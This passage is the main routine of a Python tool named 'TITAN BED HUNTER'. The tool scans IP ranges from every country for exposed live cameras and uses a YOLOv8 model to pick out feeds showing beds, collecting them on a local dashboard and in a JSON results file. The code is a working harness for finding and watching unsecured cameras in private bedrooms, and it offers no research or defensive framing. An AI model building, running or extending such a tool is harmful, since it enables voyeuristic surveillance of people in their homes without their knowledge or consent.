    TARGET = args.target

    # Build CIDR list — ALL countries for maximum width
    all_cidrs: list[str] = []
    for country_cidrs in GLOBAL_CIDRS.values():
        all_cidrs.extend(country_cidrs)
    print(f"[INIT] {len(all_cidrs)} CIDRs across {len(GLOBAL_CIDRS)} countries")

    # Preload YOLO
    print("[INIT] Loading YOLOv8...")
    get_yolo()
    print("[INIT] YOLO ready")

    # Generate initial empty dashboard
    regen_dashboard()

    # Start HTTP server
    t = threading.Thread(target=serve, args=(args.port,), daemon=True)
    t.start()

    print(f"\n{'='*60}")
    print(f"  TITAN BED HUNTER — Worldwide Scan")
    print(f"  Target  : {TARGET} bed cameras")
    print(f"  CIDRs   : {len(all_cidrs)}")
    print(f"  Workers : {args.workers}")
    print(f"  Batch   : {args.batch} IPs/round")
    print(f"  Dashboard: http://localhost:{args.port}")
    print(f"{'='*60}\n")

    try:
        hunt_loop(all_cidrs, http_workers=args.workers, batch_size=args.batch)
        print(f"\n  Dashboard: http://localhost:{args.port}")
        print(f"  Results : {RESULTS / 'bed_cams_live.json'}")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  Stopped. {len(BED_CAMS)} bed cams / {len(FOUND_CAMS)} total live cams found.")
        save_results()
        regen_dashboard()
